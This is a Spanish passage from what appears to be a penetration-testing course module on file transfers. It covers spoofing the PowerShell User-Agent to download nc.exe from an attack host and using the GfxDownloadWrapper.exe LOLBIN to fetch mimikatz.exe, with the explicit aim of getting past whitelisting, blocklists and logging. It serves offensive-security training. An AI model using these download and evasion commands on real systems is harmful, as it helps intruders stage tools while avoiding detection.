## Cambiando el User Agent

Si los administradores o defensores diligentes han puesto en la lista negra alguno de estos User Agents, [Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.1) contiene un parámetro UserAgent, que permite cambiar el agente de usuario predeterminado a uno que emule Internet Explorer, Firefox, Chrome, Opera o Safari. Por ejemplo, si Chrome se usa internamente, configurar este User Agent puede hacer que la solicitud parezca legítima.

### Listado de User Agents

```r
PS C:\htb>[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl

Name       : InternetExplorer
User Agent : Mozilla/5.0 (compatible; MSIE 9.0; Windows NT; Windows NT 10.0; en-US)

Name       : FireFox
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) Gecko/20100401 Firefox/4.0

Name       : Chrome
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0
             Safari/534.6

Name       : Opera
User Agent : Opera/9.70 (Windows NT; Windows NT 10.0; en-US) Presto/2.2.1

Name       : Safari
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0
             Safari/533.16
```

Invocando Invoke-WebRequest para descargar nc.exe usando un User Agent de Chrome:

### Solicitud con User Agent de Chrome

```r
PS C:\htb> $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```

```r
nc -lvnp 80

listening on [any] 80 ...
connect to [10.10.10.32] from (UNKNOWN) [10.10.10.132] 51313
GET /nc.exe HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6
(KHTML, Like Gecko) Chrome/7.0.500.0 Safari/534.6
Host: 10.10.10.32
Connection: Keep-Alive
```

---

## LOLBAS / GTFOBins

La lista blanca de aplicaciones puede evitar que uses PowerShell o Netcat, y el registro de la línea de comandos puede alertar a los defensores sobre tu presencia. En este caso, una opción puede ser usar un "LOLBIN" (living off the land binary), también conocido como "binarios de confianza desplazada". Un ejemplo de LOLBIN es el controlador de gráficos Intel para Windows 10 (GfxDownloadWrapper.exe), instalado en algunos sistemas y que contiene funcionalidad para descargar archivos de configuración periódicamente. Esta funcionalidad de descarga se puede invocar de la siguiente manera:

### Transferencia de Archivos con GfxDownloadWrapper.exe

```r
PS C:\htb> GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
```

Dicho binario podría estar permitido para ejecutarse por la lista blanca de aplicaciones y ser excluido de las alertas. Otros binarios más comúnmente disponibles también están disponibles, y vale la pena revisar el proyecto [LOLBAS](https://lolbas-project.github.io/) para encontrar un binario adecuado de "file download" que exista en tu entorno. El equivalente en Linux es el proyecto [GTFOBins](https://gtfobins.github.io/) y definitivamente también vale la pena revisarlo. Al momento de escribir, el proyecto GTFOBins proporciona información útil sobre casi 40 binarios comúnmente instalados que se pueden usar para realizar transferencias de archivos.

---

## Reflexiones Finales

Como hemos visto en este módulo, hay muchas formas de transferir archivos hacia y desde nuestro host de ataque entre sistemas Windows y Linux. Vale la pena practicar tantas de estas formas como sea posible a lo largo de los módulos en el Penetration Tester path. ¿Tienes una web shell en un objetivo? Prueba descargar un archivo al objetivo para realizar una enumeración adicional usando Certutil. ¿Necesitas descargar un archivo del objetivo? Prueba con un servidor SMB de Impacket o un servidor web Python con capacidades de carga. Vuelve a este módulo periódicamente y esfuérzate por usar todos los métodos enseñados de alguna manera. Además, tómate un tiempo cada vez que trabajes en un objetivo o laboratorio para buscar un LOLBin o GTFOBin que no hayas utilizado antes para lograr tus objetivos de transferencia de archivos.